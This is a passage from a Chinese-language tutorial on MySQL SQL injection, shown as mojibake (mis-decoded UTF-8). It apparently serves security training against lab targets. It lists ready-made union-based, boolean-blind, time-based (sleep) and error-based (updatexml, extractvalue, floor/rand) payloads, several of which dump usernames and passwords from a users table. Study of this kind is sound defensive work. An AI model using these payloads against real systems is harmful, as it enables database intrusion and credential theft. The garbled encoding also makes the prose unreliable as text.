äº†5ç§’ï¼Œåˆ™è¯´æ˜æ­¤å¤„å­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡å»¶æ—¶æ³¨å…¥ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œæˆ‘ä»¬æ„å»ºunion selectè¯­å¥æ—¶ï¼Œå½“å‰é¢çš„æŸ¥è¯¢è¯­å¥ä¸ºå‡ï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œunion selectä¹‹åæŸ¥è¯¢å‡ºçš„ç»“æœå°±ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å‰é¢æŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ  and 1=2 ä½¿è¯­å¥å˜å‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†idä¼ å…¥ä¸€ä¸ªè´Ÿæ•°ï¼Œæ¥ä½¿è¯­å¥å˜å‡ã€‚ STEP1ï¼šåˆ¤æ–­é—­åˆç¬¦ STEP2ï¼šåˆ¤æ–­åˆ—æ•° è”åˆæŸ¥è¯¢ä¼šå°†ä¸¤æ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·è¿”å›ï¼äºæ˜¯åæ˜ å‡ºè”åˆæŸ¥è¯¢éœ€éµå®ˆçš„ä¸€ä¸ªè§„åˆ™ä¾¿æ˜¯ï¼Œä¸¤æ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢å­—æ®µæ•°å¿…é¡»ç›¸ç­‰ï¼Œäºæ˜¯ä¹åœ¨åˆ©ç”¨è”åˆæŸ¥è¯¢è¿›è¡Œæ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥è¦åšçš„å°±æ˜¯åˆ¤æ–­åˆ¤æ–­åç«¯ä»£ç ä¸­çš„SQLæŸ¥è¯¢è¯­å¥çš„å­—æ®µæ•°ã€‚ select id,username,passwd from t_user order by 4; order by +æ•°å­— é€šè¿‡é¡µé¢çŠ¶æ€æŸ¥çœ‹æœ‰å‡ åˆ—ç„¶åé€šè¿‡union select åˆ¤æ–­å›æ˜¾ä½ï¼ˆæ³¨æ„åˆ¤æ–­å›æ˜¾ä½çš„æ—¶å€™ï¼Œå‰é¢æŸ¥è¯¢çš„å€¼è¦ä¸ºå‡ï¼Œä¸ç„¶å›æ˜¾ä½ä¼šè¢«å‰é¢æŸ¥è¯¢çš„ç»“æœæ‰€å ç”¨ï¼Œå¯¼è‡´çœ‹ä¸åˆ°å›æ˜¾ä½ï¼‰ é¶åœºç»éªŒï¼ˆå¦‚æœorder byè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥é€šè¿‡ group by æ¥åˆ¤æ–­ï¼Œæˆ–è€… union select 1,2,3,4,5,6, è¿™ä¸¤çš„åˆ—æ•°æŸ¥è¯¢åˆ¤æ–­ç½‘é¡µçŠ¶æ€ï¼‰ STEP 3ï¼šæŸ¥æ•°æ®åº“å æ³¨æ„ï¼šï¼ˆunion å’Œunion all çš„åŒºåˆ« union all æ˜¾ç¤ºé‡å¤çš„å€¼ï¼Œè€Œunionä¸æ˜¾ç¤ºé‡å¤çš„å€¼ï¼Œå½“union select ç”¨ä¸äº†çš„æ—¶å€™å¯ä»¥é€šè¿‡union all æ¥æŸ¥è¯¢ï¼‰ ?id=-1 union select 1,database(),1--+ â€‹ æ³¨æ„id=-1,æ­¤å¤„idçš„å€¼å¿…é¡»æ˜¯ä¸€ä¸ªåœ¨æ•°æ®åº“ä¸­idå­—æ®µä¸å­˜åœ¨çš„å€¼ï¼Œå¦åˆ™è”åˆæŸ¥è¯¢ç¬¬ä¸€æ¡è¯­å¥çš„æŸ¥è¯¢ç»“æœå°†å æ®æ˜¾ç¤ºä½ï¼Œæˆ‘ä»¬éœ€è¦çš„ç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœå°±ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºåˆ°æµè§ˆå™¨ä¸­ã€‚ STEP 4ï¼šæŸ¥è¡¨å â€‹ å‡å¦‚ä¸Šä¸€æ­¥æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®åº“åä¸ºsecurity ?id=-1' union select 1,group_concat(table_name),1 from information_schema.tables where table_schem='security'--+ æ³¨æ„ç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥æˆ‘ä»¬payloadæ’å…¥ä½ç½®çš„å­—æ®µä¸€å®šè¦åœ¨å‰ç«¯æœ‰å›æ˜¾ï¼Œå¦åˆ™æˆ‘ä»¬å°†ä¸èƒ½æŸ¥çœ‹åˆ°æŸ¥è¯¢ç»“æœã€‚ STEP 5ï¼šæŸ¥åˆ—å å‡å¦‚ä¸Šä¸€æ­¥æŸ¥è¯¢å‡ºæ¥çš„è¡¨åä¸­æœ‰userè¡¨ ?id=-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='user'--+ STEP 6ï¼šæŸ¥æ•°æ® å‡å¦‚ä¸Šä¸€æ­¥æŸ¥è¯¢å‡ºæ¥çš„å­—æ®µæœ‰usernameä¸password ?id=-1' and select 1,group_concat(concat(0x7e,username,0x7e,passwd,0x7e)),1 from user--+ 4.2 æœ‰å›æ˜¾ 4.2.1 è”åˆæŸ¥è¯¢æ³¨å…¥ information_schemaåº“ç®€ä»‹ information_schemaåº“æ˜¯mySQLè‡ªå¸¦çš„ä¸€ä¸ªåº“ï¼Œå…¶ä¸­åŒ…å«äº†å½“å‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ‰€æœ‰ä¿¡æ¯ï¼Œä½†è¯¥æ•°æ®åº“å¹¶ä¸æ˜¯ä¸€ä¸ªå®ä½“çš„æ•°æ®åº“ï¼Œå®ƒä¸å­˜å‚¨ä»»ä½•å®é™…æ„ä¹‰ä¸Šçš„æ•°æ®ï¼Œå®ƒåªæ˜¯æ•´ä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¸€ä¸ªè§†å›¾ï¼Œå½“æŸä¸ªæ•°æ®åº“çš„æŸä¸ªè¡¨å‘ç”Ÿå˜åŒ–æ—¶ï¼Œinformation_schemaåº“ä¸­ç›¸å…³çš„æ•°æ®å°†åŒæ—¶å‘ç”Ÿå˜åŒ–ã€‚ åœ¨æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯è¯¥åº“ä¸­çš„schemataã€tablesã€columnsä¸‰ä¸ªè¡¨ã€‚ä»–ä»¬åˆ†åˆ«å­˜å‚¨äº†æ•´ä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ‰€æœ‰æ•°æ®åº“ä¿¡æ¯ï¼Œè¡¨ä¿¡æ¯ï¼Œå­—æ®µä¿¡æ¯ã€‚åœ¨schemataè¡¨ä¸­ï¼Œé€šè¿‡schema_nameå­—æ®µå¯ä»¥è·å–æ‰€æœ‰çš„æ•°æ®åº“åï¼›åœ¨tables,é€šè¿‡table_nameã€table_schemaå­—æ®µå¯ä»¥è·å–æ‰€æœ‰çš„è¡¨åä¸å…¶å¯¹åº”çš„æ•°æ®åº“åï¼›åœ¨columnsè¡¨ä¸­ï¼Œé€šè¿‡columnsã€table_nameã€table_schemaå­—æ®µå¯ä»¥è·å–æ‰€æœ‰çš„å­—æ®µåä»¥åŠå…¶æ‰€å±è¡¨ä¸æ•°æ®åº“ã€‚ æˆ‘ä»¬çš„æ³¨å…¥æ€è·¯å°±æ˜¯å…ˆé€šè¿‡mysqlçš„å†…å»ºå‡½æ•°database(),è·å–å½“å‰æ•°æ®åº“åï¼Œå†é€šè¿‡tablesè¡¨è·å–ï¼Œæ‰€æœ‰çš„è¡¨ä¿¡æ¯ï¼Œå†é€šè¿‡columnsè¡¨è·å–ä¸Šè¿°è¡¨æ‰€æœ‰çš„å­—æ®µï¼Œæœ€åé€šè¿‡å­—æ®µæŸ¥è¯¢æƒ³è¦çš„æ•°æ®ã€‚ å½“ç„¶ä½¿ç”¨information_schemaåº“æŸ¥è¯¢ä¿¡æ¯æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¡ä»¶é™åˆ¶ï¼Œé‚£å°±æ˜¯ï¼Œéœ€è¦å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å…·æœ‰è¯»è¯¥æ•°æ®åº“çš„æƒé™ï¼Œ åº”ç”¨åœºæ™¯ UNIONè¿ç»­çš„å‡ ä¸ªæŸ¥è¯¢çš„å­—æ®µæ•°ä¸€æ ·ä¸”åˆ—çš„æ•°æ®ç±»å‹è½¬æ¢ç›¸åŒï¼Œå°±å¯ä»¥æŸ¥è¯¢æ•°æ®ï¼› æ³¨å…¥ç‚¹æœ‰å›æ˜¾ï¼› åªæœ‰æœ€åä¸€ä¸ªSELECTå­å¥å…è®¸æœ‰ORDER BYï¼›åªæœ‰æœ€åä¸€ä¸ªSELECTå­å¥å…è®¸æœ‰LIMITã€‚ UNIONæ³¨å…¥çš„æµç¨‹ graph LR A[order byç¡®å®šåˆ—æ•°] --&gt; B[\"æŸ¥çœ‹è¿”å›ç‚¹,é€‰å–å¯ä»¥æ˜¾ç¤ºæ•°æ®çš„ä½ç½®\"] B --&gt; C[\"è¯»åº“ã€è¯»è¡¨ã€è¯»æ•°æ®(å¯æ‰§è¡Œä»»æ„è¯­å¥)\"] æ³¨æ„: ä¸ºä»€ä¹ˆ order by èƒ½ç¡®å®šåˆ—æ•°ï¼Ÿorder by çš„ä½œç”¨ä¸ºæ ¹æ®ä¸€åˆ—æˆ–è€…å¤šåˆ—çš„å€¼ï¼ŒæŒ‰ç…§å‡åºæˆ–è€…é™åºæ’åˆ—æ•°æ®ï¼Œå½“è¶…å‡ºè¡¨çš„åˆ—æ•°æ—¶å‘ç”ŸæŠ¥é”™ã€‚ ä¸ºä»€ä¹ˆéœ€è¦ç¡®å®šåˆ—æ•°ï¼ŸUNION å†…éƒ¨çš„ SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒçš„åˆ—ï¼ˆå¯ç”¨äºŒåˆ†å¿«é€ŸæŸ¥æ‰¾ï¼‰ 4.2.2 ç›²æ³¨ ç›²æ³¨åˆåˆ†ä¸ºå¸ƒå°”ç›²æ³¨ä¸æ—¶é—´ç›²æ³¨ä¸¤ç§ç±»å‹ å¸ƒå°”ç›²æ³¨ åŸºæœ¬åŸç†æ˜¯ï¼šé€šè¿‡æ§åˆ¶é€šè¿‡andè¿æ¥èµ·æ¥çš„å­å¥çš„å¸ƒå°”å€¼ï¼Œæ¥æ§åˆ¶é¡µé¢çš„æ˜¾ç¤ºç»“æœæ¥åˆ¤æ–­andåå­å¥çš„çœŸå®æ€§,boolç›²æ³¨é€‚ç”¨äºboolåˆ¤æ–­çš„ç»“æœèƒ½å¤Ÿå›æ˜¾åœ¨ç•Œé¢å†…å®¹ä¸­çš„æƒ…å†µï¼Œä¾‹å¦‚ç•Œé¢æ–‡æœ¬çš„å˜åŒ–ã€‚ä¸¾ä¸ªä¾‹å­ ?id=1' and substring(database(),1,1)='s'--+ æ ¹æ®andçš„ç‰¹æ€§ï¼Œå½“andè¿ç®—ç¬¦å·¦è¾¹çš„è®¡ç®—ç»“æœä¸ºçœŸæ—¶ä¼šç»§ç»­åˆ¤æ–­åè¾¹çš„è¿ç®—ç»“æœï¼Œå¦‚æœå³è¾¹çš„ç»“æœä¹Ÿä¸ºçœŸåˆ™æ•´ä¸ªè¯­å¥ä¸ºçœŸï¼Œå½“å³è¾¹çš„è¯­å¥ä¸ºå‡æ—¶ï¼Œåˆ™æ•´ä¸ªè¯­å¥ä¸ºå‡ï¼›å½“andå·¦è¾¹çš„è¿ç®—ç»“æœä¸ºå‡æ—¶ï¼Œåˆ™ç›´æ¥åˆ¤æ–­æ•´ä¸ªè¯­å¥ä¸ºå‡ï¼Œä¸¾ä¾‹å¦‚ä¸‹ 1==1 and 1==2 //false 1==1ä¸ºtrue,ç»§ç»­åˆ¤æ–­1==2çš„ç»“æœä¸ºfalseï¼Œæ•´ä½“ä¸ºfalse 1==1 and 2==2 //true 1==1ä¸ºtrue,ç»§ç»­åˆ¤æ–­2==2çš„ç»“æœä¸ºtrueï¼Œæ•´ä½“ä¸ºtrue 1==2 and 1==1 //false 1==2ä¸ºflse,ç›´æ¥åˆ¤æ–­æ•´ä½“ä¸ºfalseï¼Œä¸å†å¯¹å³è¾¹çš„å†…å®¹è¿›è¡Œåˆ¤æ–­ 1==2 and 1==2 //fale 1==2ä¸ºflse,ç›´æ¥åˆ¤æ–­æ•´ä½“ä¸ºfalseï¼Œä¸å†å¯¹å³è¾¹çš„å†…å®¹è¿›è¡Œåˆ¤æ–­ â€‹ åˆ©ç”¨andçš„è¿™ä¸ªç‰¹æ€§ï¼Œid=1æ’ä¸ºçœŸçš„æ—¶å€™ï¼Œandå³è¾¹substringå­å¥çš„æ‰§è¡Œç»“æœå°†ç›´æ¥å½±å“è¿™ä¸ªSQLæŸ¥è¯¢è¯­å¥çš„ç»“æœï¼Œå³substringå­å¥ä¸ºçœŸï¼Œæ•´ä¸ªæŸ¥è¯¢è¯­å¥ä¸ºçœŸï¼Œé¡µé¢æ­£å¸¸å›æ˜¾å†…å®¹ï¼Œå½“substringå­å¥ä¸ºå‡çš„æ—¶å€™ï¼Œæ•´ä¸ªæŸ¥è¯¢è¯­å¥ä¸ºå‡ï¼Œé¡µé¢ä¸æ­£å¸¸å›æ˜¾å†…å®¹ã€‚ â€‹ åœ¨ä¸Šé¢æˆ‘ä»¬æ„é€ çš„æŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¯¹æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ®µè¿›è¡Œäº†åˆ¤æ–­ï¼Œå‡å¦‚åˆ¤æ–­æ­£ç¡®ï¼Œé‚£ä¹ˆæ¥ç€å¯¹ç¬¬äºŒä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­ ?id=1' and substring(database(),1,2)='se'--+ â€‹ ç›´åˆ°æ•°æ®åº“åçš„æœ€åä¸€ä¸ªå­—ç¬¦è¢«æ‰¾å‡ºæ¥ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿‡ç¨‹è€—æ—¶è€—åŠ›ï¼Œæˆ‘ä»¬è¦å¯¹æ‰€æœ‰å¯èƒ½çš„å¤§å°å†™å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæšä¸¾ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘é€è¿‡è‡ªåŠ¨åŒ–è„šæœ¬çš„æ–¹å¼æ¥è¿›è¡Œåˆ¤æ–­ã€‚è¿™é‡Œå¯¹è„šæœ¬çš„ç¼–å†™æ¨èé€‚ç”¨pythonè¯­è¨€ï¼Œå…¶requestå¯ä»¥å¾ˆæ–¹ä¾¿çš„æ„é€ è¯·æ±‚ã€‚ â€‹ è¦è·å–è¡¨åã€å­—æ®µåã€æ•°æ®ï¼Œåªéœ€å°†ä¸Šè¿°database()æ›¿æ¢ä¸ºå¯¹åº”payloadå³å¯ï¼Œå¦‚è¦è·å–è¡¨å 1' or length((select database()))=8# //åˆ¤æ–­æ•°æ®åº“åå­—é•¿åº¦ 1' or ascii(substr((select database()),1,1))=115# //åˆ¤æ–­æ•°æ®åº“å 1' or (select count(table_name) from information_schema.tables where table_schema=database())=4# //åˆ¤æ–­è¡¨çš„ä¸ªæ•° 1' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117# //åˆ¤æ–­è¡¨çš„åå­— 1' or (select count(column_name) from information_schema.columns where table_name='users')=14# //åˆ¤æ–­åˆ—çš„ä¸ªæ•° 1' or ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1))=117# //åˆ¤æ–­åˆ—çš„åå­— 1' or (select count(username) from users)=13# //åˆ¤æ–­ç”¨æˆ·åå’Œå¯†ç çš„ä¸ªæ•° 1' or ascii(substr((select username from users limit 0,1),1,1))=68# //åˆ¤æ–­ç”¨æˆ·åå’Œå¯†ç  //orå½“ç„¶åœ¨ä¸å¯¹ 1 è¿›è¡Œåˆ¤æ–­çš„æƒ…å†µä¸‹å¯ä»¥æ¢ä¸ºand æ—¶é—´ç›²æ³¨ â€‹ æ—¶é—´ç›²æ³¨ä¸å¸ƒå°”ç›²æ³¨æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œåªä¸è¿‡åˆ¤æ–­è¯­å¥æ­£ç¡®ä¸å¦çš„æ ‡å¿—ä¸å†æ˜¯æŸ¥è¯¢ç»“æœæœ‰æ²¡æœ‰è¢«æ­£ç¡®å¾—å›æ˜¾ï¼Œè€Œæ˜¯ç½‘é¡µçš„å“åº”æ—¶é—´ã€‚çœ‹ä¸‹é¢è¯­å¥: ?id=1' and if (length(database())&lt;20,sleep(5),1)--+ â€‹ ä¸Šä¾‹ä¸­ï¼Œé€šè¿‡lengthå‡½æ•°è·å–äº†å½“å‰æ•°æ®åº“çš„é•¿åº¦å¹¶ä¸20è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°æ®åº“åé•¿åº¦å°äº20ï¼Œé‚£ä¹ˆåˆ™å»¶æ—¶5ç§’å‘åç«¯è„šæœ¬ç¨‹åºå›æ˜¾æŸ¥è¯¢ç»“æœï¼Œå¦‚æœæ•°æ®åº“åä¸å°äº20ï¼Œåˆ™ç›´æ¥å›æ˜¾ç»“æœã€‚å»¶æ—¶5ç§’çš„ç»“æœè¡¨ç°åœ¨å®¢æˆ·ç«¯å°±æ˜¯å½“å‰æµè§ˆå™¨tabçš„æ ‡é¢˜éƒ¨åˆ†ä¼šä¸€ç›´è½¬åœˆåœˆã€‚ç„¶åé€šè¿‡äºŒåˆ†æ³•ã€‚å³å°†ä¸Šè¿°è¯­å¥ä¸­çš„20æ”¹ä¸º10ç»§ç»­æµ‹è¯•ï¼Œå¦‚æœä¸å°äº10ï¼Œåˆ™åœ¨å°†10ä¿®æ”¹ä¸º15ï¼ŒæŒ‰ç…§æ­¤è§„å¾‹æˆ‘ä»¬é€æ¸ç´§é€¼æ‰¾åˆ°å½“å‰æ•°æ®åº“åçš„çœŸæ­£é•¿åº¦ã€‚æ•°æ®åº“åçš„é•¿åº¦ç¡®è®¤ä¹‹åï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹è·å–æ•°æ®åº“åçš„å€¼äº†ï¼š ?id=1' and if (substring(database(),1,1)='s',sleep(5),1)--+ â€‹ é€šè¿‡ä¸Šè¿°å¸ƒå°”ç›²æ³¨ä¸­è®²åˆ°çš„æ–¹æ³•ï¼Œæœ€ç»ˆè·å–åˆ°æ•°æ®åº“åã€‚å½“ç„¶ä¸Šé¢çš„è¯­å¥æˆ‘ä»¬è¿˜æœ‰å…¶ä»–çš„å˜ç§ï¼Œå¦‚ï¼š ?id=1' and if (ascii(substring(database(),1,1))=67,sleep(5),1)--+ //é€šè¿‡asciiç æ¥æ¯”è¾ƒ ?id=1' and if (hex(substring(database(),1,1))=FF,sleep(5),1)--+ //é€šè¿‡åå…­è¿›åˆ¶å€¼æ¥æ¯”è¾ƒ ?id=1' and if (mid(database(),1,1)='s',sleep(5),1)--+ //ä½¿ç”¨midå‡½æ•°ä»£æ›¿substring ?id=1' and if (substr(database(),1,1)='s',sleep(5),1)--+ //å’Œsubstringæ˜¯ç­‰æ•ˆçš„ ?id=1' and if (left(database(),2)='se',sleep(5),1)--+ //æˆªå–å·¦è¾¹ä¸¤ä¸ªä¸ªå­—ç¬¦ ?id=1' and if (right(database(),2)='ty',sleep(5),1)--+ //æˆªå–å³è¾¹ä¸¤ä¸ªå­—ç¬¦ â€‹ è¦è·å–è¡¨æ˜ã€å­—æ®µåã€æ•°æ®åªéœ€å°†ä¸Šé¢payloadä¸­çš„database()æ›¿æ¢ä¸ºè”åˆæŸ¥è¯¢æ³¨å…¥ä¸­çš„payloadå³å¯ï¼Œå¦‚è¦è·å–è¡¨åï¼Œåˆ™æ„é€ å¦‚ä¸‹è¯­å¥ï¼š ?id=1'and if(length((select database()))&gt;9,sleep(5),1)--+ //é•¿åº¦ ?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+//åå­— ?id=1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1))=5,sleep(5),1)--+//é•¿åº¦ ?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()limit 3,1),1,1))&gt;99,sleep(5),1)--+ //åå­— ?id=1' and if((select count(column_name) from information_schema.columns where table_name='users'),sleep(5),1)=14--+ //ä¸ªæ•° ?id=1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1))=8,sleep(5),1)--+ //é•¿åº¦ ?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1)),sleep(5),1)=117--+ //åˆ—å ?id=1' and if((select count(username) from users)&gt;13,sleep(5),1)--+ //å¤šå°‘ä¸ªç”¨æˆ·å ?id=1' and if(length(substr((select username from users limit 0,1),1))=4,sleep(5),1)--+ //ç”¨æˆ·åæˆ–è€…å¯†ç çš„é•¿åº¦ ?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),1)--+ //æ¯ä¸ªç”¨æˆ·åå’Œå¯†ç çš„åå­— 1ã€mid()å‡½æ•° æ­¤å‡½æ•°ä¸ºæˆªå–å­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ã€‚MID(column_name,start[,length]) 2ã€substr()å‡½æ•° ç”¨æ³•ï¼šsubstr(string string,num start,num length); stringä¸ºå­—ç¬¦ä¸²ï¼›startä¸ºèµ·å§‹ä½ç½®ï¼›lengthä¸ºé•¿åº¦ã€‚ æ³¨æ„ï¼šmysqlä¸­çš„startæ˜¯ä»1å¼€å§‹çš„ã€‚ ä¾‹ï¼šsubstr(database(),1,1)=â€˜aâ€™ é€šè¿‡=å³ä¾§å­—æ¯çš„æ”¹å˜å’Œè¡¨è¾¾å¼çš„çœŸå‡åˆ¤æ–­åº“å 3ã€left()å‡½æ•° æ­¤å‡½æ•°ç”¨æ³•ï¼šleft(a,b) ä»å·¦ä¾§æˆªå– a çš„å‰ b ä½ ä¾‹ï¼šleft(database(),1)=â€˜aâ€™ é€šè¿‡=å³ä¾§å­—æ¯çš„æ”¹å˜å’Œè¡¨è¾¾å¼çš„çœŸå‡åˆ¤æ–­åº“å 4.2.3 æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨æ•°æ®åº“çš„æŸäº›æ­£å¸¸çš„æœºåˆ¶ï¼Œäººä¸ºå¾—åˆ¶é€ é”™è¯¯ï¼Œå°†æŸ¥è¯¢å¾—ç»“æœæºå¸¦åœ¨æŠ¥é”™ä¿¡æ¯ä¸­å›æ˜¾åˆ°å®¢æˆ·ç«¯ã€‚ ä»€ä¹ˆåœºæ™¯ä¸‹æœ‰ç”¨ï¼Ÿ æŸ¥è¯¢ä¸å›ç°å†…å®¹ï¼Œä½†ä¼šæ‰“å°é”™è¯¯ä¿¡æ¯ Updateã€Insertç­‰è¯­å¥ï¼Œä¼šæ‰“å°é”™è¯¯ä¿¡æ¯ï¼ˆå‰é¢çš„union ä¸é€‚åˆ update è¯­å¥ï¼‰ è¿™ç§åœºæ™¯çš„æºç æ˜¯æ€æ ·çš„? if($row) { echo 'Your Login name:'.roe['username']; } else { print_r(mysql_error()); } å½“æ‰§è¡Œçš„SQLè¯­å¥å‡ºé”™æ—¶è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œåœ¨é”™è¯¯ä¿¡æ¯ä¸­è¿”å›æ•°æ®åº“çš„å†…å®¹ï¼Œå³å¯å®ç°SQLæ³¨å…¥ã€‚ é‚£ä¹ˆå®ç°SQLæ³¨å…¥çš„éš¾ç‚¹å°±åœ¨äºæ„é€ è¯­å¥ï¼Œåˆ¶é€ é”™è¯¯ï¼Œè®©é”™è¯¯ä¸­åŒ…å«æ•°æ®åº“å†…å®¹ã€‚ è¿™é‡Œä»‹ç»3ä¸ªå‡½æ•°å¼•èµ·æŠ¥é”™ï¼Œå…¶ä»–çš„å‡½æ•°ç±»ä¼¼ã€‚ floor() select count() from information_schema.tables group by concat((select version()),floor(rand(0)2)) æ³¨: group byå¯¹randï¼ˆï¼‰å‡½æ•°æ“ä½œæ—¶äº§ç”Ÿäº†é”™è¯¯ extractvalue() extractvalue(1,concat(0x7eï¼Œ(select user()),0x7e)) æ³¨: xpathè¯­æ³•å¯¼è‡´çš„é”™è¯¯ updatexml() select updatexml(1,concat(0x7e,(select version()),0x7e),1) æ³¨: xpathè¯­æ³•å¯¼è‡´çš„é”™è¯¯ updatexmlæ³¨å…¥ â€‹ updatexmlå‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªxmlæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¬¦åˆxpathè¯­æ³•è§„èŒƒçš„å­—ç¬¦ä¸²ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦æ›¿æ¢æˆçš„å­—ç¬¦ä¸²ã€‚è¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯ä»ç¬¬ä¸€ä¸ªxmlå­—ç¬¦ä¸²ä¸­é€šè¿‡xpathè¯­æ³•é€‰æ‹©åŒ¹é…çš„éƒ¨åˆ†æ›¿æ¢æˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å†…å®¹ã€‚å¹¶ä¸”å½“xpathè¯­æ³•å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œå°†ä¼šå›æ˜¾æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°†æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥æ”¾åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œä½œä¸ºé”™è¯¯å›æ˜¾çš„ä¸€éƒ¨åˆ†å¤–å¸¦åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨ã€‚æ¯”å¦‚éœ€è¦è·å–åº“åï¼Œåˆ™æ„é€ å¦‚ä¸‹è¯­å¥ ?id=1' and updatexml(1,concat(0x7e,database()),1)--+ //andå¯ä»¥è¢«æ›¿æ¢ä¸ºor,å¦‚æœä¸ºor,åˆ™è¿˜æœ‰ä¸€å¤„éœ€è¦ä¿®æ”¹ï¼Œè¯·è‡ªè¡Œæ€è€ƒ(æˆ‘ä¼°è®¡æ˜¯æ”¹ä¸º-1å³å¯) â€‹ æ³¨æ„ï¼Œconcatæ˜¯å¿…é¡»çš„ï¼Œ0x7eä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™å°†ä¸ä¼šå›æ˜¾é”™è¯¯ä¿¡æ¯ï¼Œ0x7eå¯ä»¥è¢«åˆ«çš„åå…­è¿›åˆ¶æ•°ä»£æ›¿ï¼Œä½†æ˜¯æœ‰é™åˆ¶çš„ï¼Œäº²ä»¬å¯ä»¥è‡ªè¡Œå°è¯•ã€‚ä¸”0x7eä½ç½®ä¸Šçš„æ•°å­—è½¬æ¢åå¿…é¡»ä¸ºå­—ç¬¦å‹ï¼Œconcatåªèƒ½è¿æ¥å­—ç¬¦ä¸²ï¼Œä¸èƒ½è¿æ¥æ•°å­—ã€‚è·å–è¡¨åã€åˆ—åã€æ•°æ®çš„æ–¹æ³•å‚è§å‰æ–‡æè¿°ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ extractvalueæ³¨å…¥ â€‹ è¯¥å‡½æ•°ä¸updatexmlå¾ˆåƒï¼Œä½†ä»–åªæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œä¸”å…¶å®šä¹‰ä¸updatexmlä¸€æ ·ã€‚ ?id=1' and extractvalue(1,concat(0x7e,database()))--+ //andå¯ä»¥è¢«æ›¿æ¢ä¸ºor,å¦‚æœä¸ºor,åˆ™è¿˜æœ‰ä¸€å¤„éœ€è¦ä¿®æ”¹ï¼Œè¯·è‡ªè¡Œæ€è€ƒ ä¸»é”®é‡å¤æŠ¥é”™ çœ‹ä¸‹é¢çš„ä¾‹å­ ?id=1' or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+ group byå­å¥èƒ½å¤Ÿæ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„ floorå‡½æ•°çš„åŠŸèƒ½ä¸ºå‘ä¸‹å–æ•´ randå‡½æ•°å°†æ ¹æ®ä¼ å…¥çš„éšæœºæ•°ç§å­ç”Ÿæˆä¸€ä¸ª0-1ä¹‹é—´çš„éšæœºæ•°ï¼Œå½“ä¼ å…¥çš„ç§å­å›ºå®šçš„æ—¶å€™ï¼Œéšæœºæ•°çš„è§„å¾‹ä¹Ÿå°±å›ºå®šä¸‹æ¥ã€‚ countä¸ºèšåˆå‡½æ•°ï¼Œé…åˆgroup by å­å¥ï¼Œå°†å¯¹åˆ†ç»„å­—æ®µç›¸åŒçš„å€¼è¿›è¡Œè®¡æ•°ã€‚ åˆ†æä¸Šé¢çš„ä¾‹å­å°†è¦è¾¾åˆ°çš„æŸ¥è¯¢æ•ˆæœæ˜¯ï¼šä»information_schema.tablesè¡¨ä¸­æ 